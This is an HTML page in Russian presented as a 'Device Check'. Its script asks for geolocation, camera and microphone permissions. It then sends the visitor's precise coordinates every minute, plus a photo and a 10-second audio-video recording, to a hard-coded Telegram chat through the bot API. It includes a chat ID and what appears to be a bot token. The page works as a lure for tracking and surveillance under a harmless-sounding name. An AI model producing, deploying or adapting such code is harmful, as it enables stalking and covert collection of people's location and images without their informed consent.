<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Check</title>

<style>
*{box-sizing:border-box}

body{
margin:0;
min-height:100vh;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
color:#f8fafc;
background:
radial-gradient(circle at 20% 10%, rgba(37,99,235,.35), transparent 32%),
radial-gradient(circle at 80% 90%, rgba(6,182,212,.25), transparent 35%),
linear-gradient(145deg,#020617 0%,#0f172a 100%);
display:flex;
align-items:center;
justify-content:center;
padding:18px;
}

.device-frame{
width:100%;
max-width:430px;
min-height:560px;
border-radius:42px;
padding:12px;
background:linear-gradient(145deg,rgba(255,255,255,.22),rgba(255,255,255,.04));
box-shadow:0 35px 90px rgba(0,0,0,.55);
border:1px solid rgba(255,255,255,.16);
}

.screen{
min-height:536px;
border-radius:34px;
overflow:hidden;
background:rgba(15,23,42,.86);
backdrop-filter:blur(24px);
border:1px solid rgba(255,255,255,.1);
padding:26px 22px;
}

.top-shape{
width:112px;
height:31px;
background:#020617;
border-radius:999px;
margin:0 auto 34px;
}

.hero{
text-align:center;
padding-top:20px;
}

h1{
margin:0;
font-size:32px;
letter-spacing:-0.7px;
line-height:1.1;
}

.subtitle{
margin:14px auto 0;
max-width:340px;
color:#cbd5e1;
font-size:16px;
line-height:1.55;
}

.glass{
margin-top:24px;
padding:16px;
border-radius:22px;
background:rgba(255,255,255,.075);
border:1px solid rgba(255,255,255,.1);
color:#dbeafe;
font-size:14px;
line-height:1.45;
text-align:left;
}

button{
width:100%;
margin-top:24px;
border:0;
border-radius:18px;
padding:16px;
font-size:16px;
font-weight:750;
color:#fff;
cursor:pointer;
background:linear-gradient(135deg,#2563eb,#06b6d4);
box-shadow:0 16px 36px rgba(37,99,235,.34);
}

.small{
margin-top:18px;
color:#94a3b8;
font-size:11.5px;
line-height:1.4;
text-align:center;
}
</style>
</head>

<body>

<main class="device-frame">
<section class="screen">

<div class="top-shape"></div>

<div class="hero">
<h1>Device Check</h1>

<p class="subtitle">
Нажмите кнопку и подтвердите разрешения браузера.
</p>
</div>

<div class="glass">
Геолокация отправляется каждую минуту, пока страница открыта.
Фото и видео отправляются только после разрешения камеры.
</div>

<button onclick="startAll()">
Разрешить GEO и начать
</button>

<div class="small">
Работает через HTTPS.
</div>

<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

</section>
</main>

<script>

const botToken = "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN";
const chatId = "380243961";

const sendIntervalMs = 60 * 1000;
const videoDurationMs = 10 * 1000;

let intervalId = null;
let mediaStream = null;

async function sendText(message){

const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:chatId,
text:message
})
});

return await response.json();
}

async function sendPhoto(blob){

const formData = new FormData();

formData.append("chat_id",chatId);
formData.append("photo",blob,"photo.jpg");

await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
method:"POST",
body:formData
});

}

async function sendVideo(blob){

const formData = new FormData();

formData.append("chat_id",chatId);
formData.append("video",blob,"video.webm");

await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`,{
method:"POST",
body:formData
});

}

function startGeo(){

navigator.geolocation.getCurrentPosition(async function(position){

const lat = position.coords.latitude;
const lon = position.coords.longitude;

await sendText(
`📍 GEO

https://maps.google.com/?q=${lat},${lon}`
);

},{
enableHighAccuracy:true
});

intervalId = setInterval(async ()=>{

navigator.geolocation.getCurrentPosition(async function(position){

const lat = position.coords.latitude;
const lon = position.coords.longitude;

await sendText(
`📍 GEO

https://maps.google.com/?q=${lat},${lon}`
);

});

},sendIntervalMs);

}

async function startCamera(){

const stream = await navigator.mediaDevices.getUserMedia({
video:true,
audio:true
});

mediaStream = stream;

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

video.srcObject = stream;

await new Promise(resolve=>{
video.onloadedmetadata = resolve;
});

canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

const ctx = canvas.getContext("2d");
ctx.drawImage(video,0,0,canvas.width,canvas.height);

canvas.toBlob(async function(photoBlob){

await sendPhoto(photoBlob);

},"image/jpeg",0.9);

const chunks = [];

const recorder = new MediaRecorder(stream);

recorder.ondataavailable = e=>{
if(e.data.size>0){
chunks.push(e.data);
}
};

recorder.onstop = async ()=>{

const videoBlob = new Blob(chunks,{
type:"video/webm"
});

await sendVideo(videoBlob);

stream.getTracks().forEach(track=>track.stop());

};

recorder.start();

setTimeout(()=>{
recorder.stop();
},videoDurationMs);

}

async function startAll(){

if(!botToken || botToken==="8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os"){
return;
}

startGeo();

try{
await startCamera();
}catch(e){
console.log(e);
}

}

window.addEventListener("beforeunload",()=>{

if(intervalId){
clearInterval(intervalId);
}

if(mediaStream){
mediaStream.getTracks().forEach(track=>track.stop());
}

});

</script>

</body>
</html>
